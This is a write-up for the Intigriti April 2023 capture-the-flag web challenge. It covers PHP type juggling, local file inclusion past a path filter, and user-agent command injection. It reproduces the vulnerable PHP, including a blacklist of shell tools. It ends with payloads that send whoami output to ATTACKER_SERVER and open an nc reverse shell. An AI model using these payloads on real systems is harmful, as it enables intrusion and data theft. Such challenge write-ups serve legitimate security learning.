---
name: Intigriti April Challenge (2023)
authors: strangemonkey
category: Command Injection, LFI, RCE, Type Juggling
link: https://challenge-0423.intigriti.io
description: Writeup for the Intigriti April 2023 challenge 💥
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# 04-23: We Like to Sell Bricks

| Name                                                                    | Authors                                              | Category                                   |
| ----------------------------------------------------------------------- | ---------------------------------------------------- | ------------------------------------------ |
| [Intigriti April Challenge (2023)](https://challenge-0423.intigriti.io) | [strangemonkey](https://twitter.com/strangeMMonkey1) | Type Juggling, Command Injection, LFI, RCE |

## Video Walkthrough

[![PHP Type Juggling, LFI and Command Injection - Solution to April '23 Challenge](https://img.youtube.com/vi/9TCLI04vlvg/0.jpg)](https://www.youtube.com/watch?v=9TCLI04vlvg "PHP Type Juggling, LFI and Command Injection - Solution to April '23 Challenge")

## Challenge Description

> Find the flag and win Intigriti swag.

## Useful Resources

-   [Type Juggling](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Type%20Juggling/README.md)
-   [Command Injection](https://portswigger.net/web-security/os-command-injection)
-   [Command Injection Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md)
-   [LFI Cheatsheet](https://highon.coffee/blog/lfi-cheat-sheet)

## Community Writeups

1. [dnny](https://hackmd.io/@dnny/HyHWXQ6Q2)
2. [jorenverheyen](https://jorenverheyen.github.io/intigriti-april-2023.html)
3. [kevinengstrom](https://github.com/KevinEngstrom92/0423.intigriti.io_writeup/blob/main/writeup.md)
4. [sgrum0x](https://www.youtube.com/watch?v=U9AbhUMdpfY)
5. [n25sec](https://n25.uk/2023-05-01-intigriti-challenge-0423)
6. [ilnumero6](https://medium.com/@ilnumero6/intigriti-challenge-0423-write-up-9ed04997e4b3)
7. [k1ng_pr4wn](https://k1ngpr4wns-world.ghost.io/intigriti-april-2023-challenge)
8. [lyubo_tsirkov](https://github.com/lyubotsirkov/writeups/blob/main/intigriti-0423-solution.md)

## Solution

Credentials are provided to log in as a normal user; `strange:monkey`.

### Part 1 (Type Juggling)

The intended path is to check the cookies and see the `account_type` which determines the account role.

On the backend, the MD5 hash of the `account_type` cookie is checked to see if the user has access to exclusive (pro) features:

```php
$query = $pdo->prepare("SELECT account_type FROM users WHERE username = 'admin'");
$query->execute(array());
$account_type = $query->fetch()['account_type'];
if (isset($_COOKIE["account_type"])) {
	if (md5($_COOKIE['account_type']) == md5($account_type)) {
		echo '<div>';
		include 'custom_image.php';
		echo '<h3 id="custom_image.php - try to catch the flag.txt ;)">A special golden wall just for Premium Users ;) </h3><img src="resources/happyrating.png">$ FREE4U<a class="button" href="">View details</a></div>';
	}
}
```

However, there is a [type juggling vulnerability](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Type%20Juggling/README.md) meaning that an attacker can simply generate an MD5 hash that begins with `0e`, e.g. `RSnakeUecYwT6N2O9g --> 0e126635149374886577950106830662` ([more example hashes](https://github.com/spaze/hashes/blob/master/md5.md)).

This is because `when hashes start with "0e" (or "0..0e") only followed by numbers, PHP will treat the hash as a float`, meaning that loose comparisons, e.g. `0e126635149374886577950106830662 == "0"` return true .

According to the SQL DB, the admin role has a hash beginning with `0e`, e.g. `('admin','af1_2@df223g-$swea','RSnakeXKPLlGdf2gYf'),`. Therefore, replacing the cookie with one of these magic values will give the attacker access to new content.

_Note: to help players along, a hint is also provided in the HTML comments of `index_error.php`, which will display in error message:_ `dev TODO : remember to use strict comparison`

Viewing the source of the new `dashboard.php` will reveal a comment:

```html
<h3 id="custom_image.php - try to catch the flag.txt ;)"></h3>
```

Alternatively, players could conduct some content discovery and parameter fuzzing to get to the hidden `/custom_image.php` endpoint.

### Part 2 (Fuzz -> LFI)

If the player fuzzes the parameters for the `custom_image.php` endpoint, they'll find https://challenge-0423.intigriti.io/custom_image.php?file= produces a `Permission denied!` error.

```python
wfuzz -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u https://challenge-0423.intigriti.io/custom_image.php?FUZZ= --hh 294753
```

The endpoint is vulnerable to LFI _but_ `../../` are filtered and a simple regex will block `www/web/images`:

```php
function getImage()
{
  $file = 'www/web/images/goldenwall4admin.jpg';

  if (isset($_GET['file'])) {
    $file = $_GET['file'];
  }

  while (true) {
    if (strpos($file, "../") === false) { //OLD php version
      //if(str_contains($file,"../") === false){ //new php version
      break;
    }
    $file = str_replace("../", "", $file);
  }

  if (strtolower(PHP_OS) == "windows") {
    $file = str_replace("/", "\\", $file);
  } else {
    $file = str_replace("\\", "/", $file);
  }

  $regex = 'www/web/images';
  $pos = strpos($file, $regex);
  if ($pos === false) {
    echo "Permission denied!";
  } else {
    $imageData = base64_encode(file_get_contents($file));
    $src = 'data: image/jpeg;base64,' . $imageData;

    echo '<img src="' . $src . '">';
  }
}
getImage();
```

The player needs to bypass this, e.g. with https://challenge-0423.intigriti.io/custom_image.php?file=www/web/images/..\..\..\flag.txt

This will load a corrupted image, by copying the base64 of the image from the html and decrypting it you can get the content of this file:

```html
<img
    src="data: image/jpeg;base64,SGV5IE1hcmlvLCB0aGUgZmxhZyBpcyBpbiBhbm90aGVyIHBhdGghIFRyeSB0byBjaGVjayBoZXJlOgoKL2U3ZjcxN2VkLWQ0MjktNGQwMC04NjFkLTQxMzdkMWVmMjlhYi85NzA5ZTk5My1iZTQzLTQxNTctODc5Yi03OGI2NDdmMTVmZjcvYWRtaW4ucGhwCg=="
/>
```

Decoded:

```txt
Hey Mario, the flag is in another path! Try to check here:

/e7f717ed-d429-4d00-861d-4137d1ef29ab/9709e993-be43-4157-879b-78b647f15ff7/admin.php
```

### Part 3 (Command Injection -> RCE)

Now the player has a new endpoint to visit: https://challenge-0423.intigriti.io/e7f717ed-d429-4d00-861d-4137d1ef29ab/9709e993-be43-4157-879b-78b647f15ff7/admin.php

Whenever you visit this endpoint, as you are not an admin, you will be redirected to the login page.

Since the redirect is done incorrectly, loading the page content in the response and adding a simple location header, we have two possible ways to display the page.

1. Response manipulation; just change the 302 to 200 and remove the `location` header with burp (match and replace), or simply intercepting the response and editing it manually.
2. Edit the `username` cookie and set it from `strange` to `admin`, since the checking for the admin page is performed only on that cookie (weak).

Each time the admin page is loaded, the site logs the `User-Agent` (as hinted in the logs endpoint). Since the user agent is saved by executing a terminal command, that header is vulnerable to command injection.

There are some security checks, such as removing some characters, spaces, and some functions but locked functions can be easily bypassed, e.g. `cucurlrl` will become `curl`:

```php
$user_agent = $_SERVER['HTTP_USER_AGENT'];

#filtering user agent
$blacklist = array( "tail", "nc", "pwd", "less", "ncat", "ls", "netcat", "cat", "curl", "whoami", "echo", "~", "+",
 " ", ",", ";", "&", "|", "'", "%", "@", "<", ">", "\\", "^", "\"",
"=");
$user_agent = str_replace($blacklist, "", $user_agent);

shell_exec("echo \"" . $user_agent . "\" >> logUserAgent");
```

As for the spaces, one way to bypass them is to use `${IFS}` or `{ls,-la}` (commas will be replaced with spaces).

A simple payload to run a RCE would be to put this in your user agent:

```bash
`cucurlrl${IFS}http://ATTACKER_SERVER/?q=$(whoami)`
```

For a shell:

```bash
`nncc${IFS}ATTACKER_SERVER${IFS}4200${IFS}-e${IFS}/bin/bash`
```
